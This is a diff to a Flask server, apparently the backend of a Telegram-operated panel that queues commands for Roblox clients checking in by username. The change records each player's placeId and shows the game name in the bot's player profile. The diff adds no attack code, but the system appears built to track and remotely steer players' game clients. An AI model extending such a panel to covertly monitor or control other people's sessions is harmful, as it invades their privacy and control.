@@ -107,6 +107,19 @@ awaiting_msg_text = {}
 awaiting_msg_duration = {}
 awaiting_execute = {}
 last_seen = {}
+player_places = {}
+
+def get_roblox_game_name(place_id):
+    if not place_id:
+        return "Неизвестная игра"
+    try:
+        url = f"https://economy.roblox.com/v2/assets/{place_id}/details"
+        res = requests.get(url, timeout=3)
+        if res.status_code == 200:
+            return res.json().get("Name", "Неизвестная игра")
+    except Exception:
+        pass
+    return "Неизвестная игра"
 
 @app.route('/')
 def home():
@@ -130,6 +143,10 @@ def log_user():
 
     username = data.get('username', 'Unknown')
     user_id = data.get('userId', 'Unknown')
+    place_id = data.get('placeId')
+    
+    if place_id:
+        player_places[username] = place_id
     
     if username not in commands_queue:
         commands_queue[username] = []
@@ -153,8 +170,12 @@ def log_user():
 @app.route('/api/ping', methods=['GET'])
 def ping():
     username = request.args.get('username')
+    place_id = request.args.get('placeId')
+    
     if username:
         last_seen[username] = time.time()
+        if place_id:
+            player_places[username] = place_id
     return jsonify({"status": "success"})
 
 @app.route('/api/get_command', methods=['GET'])
@@ -273,10 +294,16 @@ def telegram_webhook():
 
                 keyboard_layout.append([{"text": "🔙 Назад", "callback_data": "menu_players"}])
                 
+                place_id = player_places.get(target_user)
+                game_info = ""
+                if place_id:
+                    game_name = get_roblox_game_name(place_id)
+                    game_info = f"\n🎮 Играет в: <b>{game_name}</b> ({place_id})"
+
                 keyboard = {"inline_keyboard": keyboard_layout}
                 send_telegram_message(
                     chat_id, 
-                    f"👤 <b>Профиль: {target_user}</b>\nЧто будем делать?", 
+                    f"👤 <b>Профиль: {target_user}</b>{game_info}\nЧто будем делать?", 
                     reply_markup=keyboard,
                     parse_mode="HTML"
                 )
